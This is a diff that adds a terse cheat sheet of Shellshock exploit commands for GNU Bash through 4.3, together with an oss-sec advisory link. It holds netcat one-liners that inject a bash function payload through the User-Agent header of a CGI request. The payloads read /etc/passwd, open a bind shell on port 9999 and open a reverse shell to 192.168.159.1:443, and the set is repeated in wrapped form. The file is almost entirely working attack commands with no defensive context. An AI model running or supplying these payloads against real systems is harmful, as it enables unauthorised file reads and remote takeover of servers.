@@ -1,0 +1,24 @@
+:%s/vulnerable/192.168.121.132/g
+
+GNU Bash through 4.3
+http://seclists.org/oss-sec/2014/q3/650
+read file
+$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
+bind shell
+$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
+reverse shell
+echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
+
+
+read file
+$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;};
+ echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
+bind shell
+$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;};
+ /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
+reverse shell
+echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;};
+ /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
+
+
+
